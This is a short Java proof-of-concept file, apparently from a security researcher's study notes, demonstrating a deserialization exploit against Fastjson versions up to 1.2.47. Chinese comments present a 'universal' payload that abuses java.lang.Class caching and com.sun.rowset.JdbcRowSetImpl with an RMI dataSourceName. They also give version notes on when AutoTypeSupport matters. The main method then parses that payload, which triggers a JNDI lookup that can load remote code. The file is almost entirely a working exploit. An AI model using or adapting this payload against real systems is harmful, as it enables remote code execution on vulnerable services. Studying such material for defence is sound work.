package Fastjson;

import com.alibaba.fastjson.JSON;

/**
 * @author L3ttuc3
 * @version 1.0
 * @date 2023/5/12 21:16
 */
public class Fastjson1247 {
    public static void main(String[] args) {
        /*
        mybatis在Fastjson 1.2.46之后也被ban了

        Fastjson <= 1.2.47的通杀payload如下：
        {
            {
                "@type": "java.lang.Class",
                "val": "com.sun.rowset.JdbcRowSetImpl"
            },
            {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "rmi://localhost/obj",
                "autoCommit": true
            }
        }

        注：Fastjson 1.2.25-1.2.32 需要AutoTypeSupport关闭，Fastjson 1.2.33-1.2.47任意都可以

         */
        String payload ="{{\"@type\": \"java.lang.Class\",\"val\": \"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"rmi://localhost/obj\",\"autoCommit\": true}}";
        JSON.parse(payload);
    }
}
